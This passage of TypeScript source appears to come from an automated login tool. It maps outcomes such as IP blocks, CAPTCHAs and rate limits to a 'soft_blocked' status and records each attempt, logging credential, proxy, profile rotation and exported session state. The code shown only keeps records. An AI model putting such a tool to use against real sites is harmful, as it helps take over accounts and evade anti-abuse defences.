      case "ip_blocked":           return "soft_blocked";
      case "captcha_block":        return "soft_blocked";
      case "rate_limited":         return "soft_blocked";
      case "2fa_required":         return "error";
      case "unexpected_redirect":  return "error";
      case "timeout":              return "error";
      case "error":                return "error";
    }
  }

  private _recordResult(
    run: LoginRun,
    credential: CredentialPair,
    profile: Profile | null,
    proxy: ProxyConfig | null,
    outcome: AttemptOutcome,
    detail: string,
    finalUrl: string,
    signals: RotationTrigger[],
    rotationEvents: RotationEvent[],
    sessionState: SessionState | undefined,
    screenshot: string | undefined,
    startedAt: string = now(),
    startMs: number = Date.now(),
  ): void {
    const finishedAt = now();
    const durationMs = Date.now() - startMs;

    const result: AttemptResult = {
      id: uuid(),
      run_id: run.id,
      credential_id: credential.id,
      profile_id: profile?.id ?? "",
      proxy_id: proxy?.server ?? null,
      started_at: startedAt,
      finished_at: finishedAt,
      duration_ms: durationMs,
      outcome,
      detail,
      final_url: finalUrl,
      session_exported: !!sessionState,
      session_state: sessionState,
      entropy_score: null,
      rotation_events: rotationEvents,
      signals_detected: signals,
      screenshot,
    };

    run.results.push(result);

    this.broadcast({
      type: "login_attempt_result",
      run_id: run.id,
      result,
    });
  }
}
